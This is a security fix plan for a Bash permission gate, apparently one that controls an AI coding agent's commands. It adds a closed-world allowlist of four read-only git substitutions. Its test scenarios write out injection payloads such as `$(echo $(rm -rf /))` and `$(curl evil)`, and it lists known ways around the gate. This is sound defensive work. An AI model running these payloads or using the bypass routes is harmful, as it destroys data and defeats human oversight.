---
artifact_contract: ce-unified-plan/v1
artifact_readiness: implementation-ready
execution: code
product_contract_source: ce-plan-bootstrap
origin: cpp#34
architect_session: 783d4a04
date: 2026-06-30
type: fix
---

# fix: Closed-world substitution-inner allowlist for chain-safety gate

## Summary

`_bash_allow_is_chain_safe` in `src/claude_pilot/permissions.py` vetoes **any**
policy-allowed Bash command containing a command-substitution marker (`$(`,
backtick, `$'`). This over-blocks legitimate read-only dispatch workflows — the
production trigger (cpp#34, mika#1617 dispatch) was:

```bash
gh pr list --head $(git branch --show-current) --json baseRefName --jq '.[0].baseRefName'
```

The outer command matches the `bash-gh-pr-read` allow rule and the inner
substitution is read-only git plumbing, yet the whole command is vetoed because
`$(` appears anywhere.

This plan adds a **closed-world allowlist** of exactly four full substitution
tokens that are known-safe, redacts each matched token to a `_SUB_` placeholder,
and then lets the **existing** chain-safety logic run unchanged. It deliberately
does NOT relax the gate semantically — the architect (mika-arch session
`783d4a04`) returned **GROOMED** with explicit rejection of a recursive
substitution validator (the issue's Option B) and of six named bypass surfaces
(B1–B6). The verdict: keep syntactic crudeness as defense-in-depth; enumerate
known-safe substitutions under a closed-world assumption.

---

## Problem Frame

`_bash_allow_is_chain_safe` (`src/claude_pilot/permissions.py:138`) is a
command-injection safety **backstop**: a policy `allow` decision is only honored
if every compound segment is independently tier1-safe or a clean (non-tier3)
policy allow. As part of that backstop, line 160–161 rejects any command
containing a substitution marker outright:

```python
if any(marker in command for marker in _SUBSTITUTION_MARKERS):
    return False
```

`_SUBSTITUTION_MARKERS = ("$(", "`", "$'")`.

This blanket veto is correct as a default — a policy-allowed write-capable dev
command never *needs* substitution. But it has no escape hatch for the narrow,
provably-safe case where the substitution is itself a short read-only git
identifier feeding a read-only outer command. The cost is recurring false
denials in the dispatch pipelines (`resolve_pr_conflicts`, `iterate`) that build
`gh pr` commands with `--head $(git branch --show-current)`.

**Why this is hard / why it needs care.** Relaxing a security backstop invites
bypass. The issue body and the architect both enumerate the traps: nested
substitution (`$(echo $(rm -rf /))`), argument-position injection into a
write-capable outer (`gh issue create --body $(curl evil)`), `$'…'` ANSI-C
escape expansion, the backtick form, extra-whitespace variants, and parser
differential (the gate's idea of the token boundary diverging from bash's). The
durable defense is to **not parse the substitution at all** — match the entire
token by literal string equality and let bash either substitute that exact token
or not.

---

## Requirements

- **R1** — A policy-allowed read-only command whose only substitution is an
  allowlisted token is honored (not vetoed). Trigger case:
  `gh pr list --head $(git branch --show-current) --json baseRefName --jq '...'`
  → `True`. (origin AC1)
- **R2** — The allowlist match is **exact literal string equality** of the whole
  substitution token (including `$(` and `)`). No bash lexing, no regex on inner
  content, no partial match, no whitespace tolerance. (origin AC2 — parser-
  differential surface)
- **R3** — After an allowlist hit, the matched token is replaced with a literal
  `_SUB_` placeholder; the **existing** chain-safety logic (segment split +
  per-segment tier1/policy check) then runs unchanged. No `return True`
  short-circuit. (origin AC2 — safe+safe composition surface)
- **R4** — Backtick and `$'` forms remain unconditionally vetoed (not
  allowlistable). (origin AC2 — polyglot/ANSI-C surfaces)
- **R5** — Any non-allowlisted `$(` token anywhere in the command vetoes the
  whole command, including nested substitution and mixed allowlisted +
  non-allowlisted. (origin AC2/AC3 — recursion-collapse + injection surfaces)
- **R6** — Existing veto behavior is preserved: every current denial-set test
  stays green. (origin AC3)
- **R7** — The closed-world allowlist contains exactly these four entries; no
  more (expansion is a separate follow-up ticket on hard evidence). (scope)

Each allowlisted entry satisfies the architect's safety invariants: inner
command is strictly read-only git plumbing, emits a short single-line
identifier, and contains no nested `$(`, backtick, redirect, or pipe.

---

## Key Technical Decisions

**KTD1 — Redaction-then-chain, not short-circuit-allow.** On an allowlist hit,
replace the token with `_SUB_` and fall through to the existing segment loop,
rather than returning `True`. Rationale: the outer command still needs full
chain-safety validation. `git status && $(git branch --show-current)` has an
allowlisted substitution but, once redacted to `git status && _SUB_`, the `_SUB_`
segment is an unknown command that fails the per-segment check → correctly
vetoed. Short-circuiting would wrongly allow it. The architect's snippet (`return
True`) was suggestive shape; redaction is the load-bearing correction (per the
spawn brief and `docs/solutions/.../command-string-policy-allow-rules-are-compound-unsafe.md`
principle of treating each substitution as an opaque token).

**KTD2 — `str.replace`, not regex.** Redaction iterates the four literal
allowlist entries and applies `str.replace(entry, "_SUB_")` (exact substring,
all occurrences). This is literal string equality by construction — no regex
engine touches the inner content, satisfying R2 and the "no parser differential"
invariant. After replacing all four, a remaining `$(` substring means an
unrecognized substitution survived → veto (R5).

**KTD3 — Backtick / `$'` veto stays first.** The redaction path applies **only**
to `$(`. If the command contains a backtick or `$'`, veto immediately (R4) —
these forms are not on the allowlist and cannot be redacted by the `$(`-keyed
replacement. Ordering: check backtick/`$'` → veto; then attempt `$(` redaction;
then re-check for residual `$(` → veto; then fall through.

**KTD4 — `_SUB_` placeholder choice.** `_SUB_` is an identifier-shaped token with
no shell metacharacters, so it cannot itself introduce a chain break, a new
substitution, or a metacharacter the downstream segment splitter would
mis-handle. As a standalone segment it is not tier1-safe and matches no policy
allow rule → fails the per-segment check (the desired behavior for R3's
`git status && _SUB_` case). As an argument inside an allowed outer
(`gh pr list --head _SUB_ ...`) the prefix-anchored allow rule still matches →
honored (R1). Confirmed: `bash-gh-pr-read` pattern is
`^gh\s+pr\s+(view|list|diff|checks)` (`src/claude_pilot/policies/permissions.yaml:114`),
which matches `gh pr list --head _SUB_ ...`.

---

## High-Level Technical Design

Substitution handling inside `_bash_allow_is_chain_safe`, replacing the single
blanket veto at line 160–161. Directional guidance, not implementation spec:

```
command arrives (heredoc / here-string cases already handled above)
        │
        ▼
  contains backtick OR $'  ? ──yes──▶ return False        (R4, KTD3)
        │ no
        ▼
  contains "$("  ?
        │ no ─────────────────────▶ (fall through to segment loop, unchanged)
        │ yes
        ▼
  redacted = command
  for entry in _SUBSTITUTION_ALLOWLIST:        (exactly 4 literal tokens)
      redacted = redacted.replace(entry, "_SUB_")   (KTD2, exact substring)
        │
        ▼
  "$(" still in redacted ? ──yes──▶ return False   (R5: unrecognized sub remains)
        │ no
        ▼
  command := redacted   (carry placeholders into segment split)
        │
        ▼
  existing: _split_compound_command → per-segment
            is_safe_bash_command OR clean policy-allow      (R3, unchanged)
```

The bare-`&` check and the segment loop below it are unchanged; the redacted
command (now free of `$(`) flows into them exactly as a substitution-free command
would.

---

## Implementation Units

### U1. Closed-world substitution allowlist + redaction in the chain-safety gate

**Goal:** Replace the blanket substitution veto with the allowlist-redact-then-chain
behavior (R1–R5, R7), preserving all existing vetoes (R6).

**Requirements:** R1, R2, R3, R4, R5, R7

**Dependencies:** none

**Files:**
- `src/claude_pilot/permissions.py` — modify

**Approach:**
- Add a module-level constant near `_SUBSTITUTION_MARKERS` (line 95):
  `_SUBSTITUTION_ALLOWLIST` — a tuple of the four exact literal tokens:
  `$(git branch --show-current)`, `$(git rev-parse --abbrev-ref HEAD)`,
  `$(git rev-parse HEAD)`, `$(git rev-parse --short HEAD)`. Comment it with the
  architect's per-entry safety invariants (read-only git plumbing, single-line
  identifier, no nested sub/backtick/redirect/pipe) and the closed-world rule
  (expansion is a follow-up ticket, not an edit here).
- Add a helper `_redact_allowlisted_substitutions(command: str) -> str | None`:
  returns the redacted command (each allowlisted token → `_SUB_`) when, after
  redaction, no `$(` remains; returns `None` when an unrecognized `$(` survives
  (caller vetoes). Keyed only on `$(` — backtick/`$'` are handled by the caller
  before this is reached.
- Rewrite the marker check at line 160–161:
  - If `` ` `` in command **or** `$'` in command → `return False` (KTD3, R4).
  - Else if `$(` in command: call the helper. `None` → `return False` (R5);
    otherwise rebind `command` to the redacted string and continue.
  - The bare-`&` check, segment split, and per-segment loop run unchanged on the
    (possibly redacted) command (R3).

**Patterns to follow:** mirror the existing module-level constant + helper style
(`_SANCTIONED_HEREDOC_OPENER_RE` / `_is_sanctioned_pure_heredoc` at lines
113–135). Keep the security-rationale comments dense, matching the surrounding
file's tone. Treat each substitution as an opaque token per
`docs/solutions/security-issues/command-string-policy-allow-rules-are-compound-unsafe.md`.

**Test scenarios:** covered in U2 (tests live in the dedicated test module).
`Test expectation: behavior verified via U2.`

**Verification:** `uv run ruff check` and `uv run mypy src` clean; the helper and
constant exist; the marker check no longer unconditionally vetoes on `$(`.

### U2. Test coverage — allow path, redaction-veto path, regression set

**Goal:** Pin every new and preserved behavior with executed assertions (R1–R6).
Per the solutions doc, permission-classifier changes need executed-exploit
coverage, not reasoning-only.

**Requirements:** R1, R2, R3, R4, R5, R6

**Dependencies:** U1

**Files:**
- `tests/test_policy_devpilot.py` — modify (add tests alongside the existing
  `_bash_allow_is_chain_safe` suite near
  `test_guard_vetoes_command_substitution_even_double_quoted`)

**Approach:** add focused `assert _bash_allow_is_chain_safe(_POLICY, "Bash",
_bash(cmd)) is <bool>` cases using the existing `_POLICY` / `_bash` helpers. Do
not modify the existing substitution-veto test — add new ones so the regression
guard stays independent.

**Test scenarios:**
- **Happy path (R1):** `gh pr list --head $(git branch --show-current) --json baseRefName --jq '.[0].baseRefName'` → `True`. Covers AC1.
- **Each allowlist entry honored (R1, R7):** for each of the four tokens, an outer
  read-only `gh pr view`/`gh pr list` command embedding it → `True` (parametrized
  or four asserts).
- **Redaction does not short-circuit (R3):** `git status && $(git branch --show-current)` → `False` (`_SUB_` is an unknown trailing segment).
- **Whitespace variant rejected (R2):** `$( git branch --show-current )` (extra
  spaces) → `False` (not the canonical literal token).
- **Read-only but off-allowlist rejected (R5, closed world):** `gh pr list --head $(git status)` → `False`.
- **Nested substitution rejected (R5):** `gh pr view $(echo $(rm -rf /))` → `False` (no allowlist match, `$(` survives redaction).
- **Mixed allowlisted + evil rejected (R5):** `gh pr list --head $(git branch --show-current) --body $(curl evil)` → `False` (residual `$(` after redacting the allowlisted token).
- **Regression — double-quoted curl sub (R6):** `mkdir "$(curl evil)"` → `False` (existing test must stay green).
- **Regression — backtick form (R4, R6):** ``mkdir `curl evil` `` → `False`.
- **Regression — `$'` ANSI-C form (R4, R6):** `mkdir $'\x41'` → `False`.

**Verification:** `uv run pytest` green, including the pre-existing
`test_guard_vetoes_command_substitution_even_double_quoted` and the rest of the
`_bash_allow_is_chain_safe` suite.

---

## Verification Contract

- `uv run ruff check` — clean
- `uv run mypy src` — clean
- `uv run pytest` — all green, no regressions in `tests/test_policy_devpilot.py`
- Manual confirmation that the four allowlist entries are present verbatim and
  that no fifth entry was added.

---

## Scope Boundaries

In scope: the four-entry allowlist, the redaction-then-chain behavior in
`_bash_allow_is_chain_safe`, and its test coverage.

### Deferred to Follow-Up Work

- **cpp#35** — `bash-git-show-redirect` rule (separate PR, follows this one).
- **mika#1639** — `bash-make-verify` allowlist entry on the mika-side classifier
  (autonomous loop handles via `ready` label).
- Expanding the substitution allowlist beyond the initial four — future PRs only
  on hard evidence of need.

### Out of scope (not this product's concern here)

- `tier1.py:278` `contains_unquoted_metacharacter` — a different layer. If this
  patch makes it inconsistent, file a follow-up rather than expanding scope.
- mika-side Rust pre-classifier (`permission_pre_classifier.rs`) — tracked
  separately; symmetric audit candidate noted in the solutions doc.

---

## Risks & Dependencies

- **Risk: bypass via an unforeseen substitution shape.** Mitigated by the
  closed-world posture — anything not literally one of the four tokens vetoes.
  `str.replace` exact-match + residual-`$(` re-check means over-blocking is the
  failure mode, which is the correct posture per the architect.
- **Risk: `_SUB_` collides with a real token meaning.** `_SUB_` has no shell
  metacharacters and is not a known command; as a standalone segment it fails the
  per-segment check (desired), and as an argument it is inert.
- **Acceptance constraint (origin AC4):** this is a security-boundary change —
  **not** author self-merged. Surface the PR for independent review; note this in
  the PR body.
- **No external dependencies.** Single-file logic change plus tests.

---

## Definition of Done

- U1 and U2 implemented; all Verification Contract gates pass.
- AC1 demonstrated by the happy-path test; AC2 by the literal-match + redaction +
  nested/mixed rejection tests; AC3 by the green regression set; AC4 honored by
  not self-merging and noting the security-boundary review requirement in the PR.
- PR opened against `senara-solutions/claude-pilot-py` with `Closes #34` and a
  reference to architect session `783d4a04`.
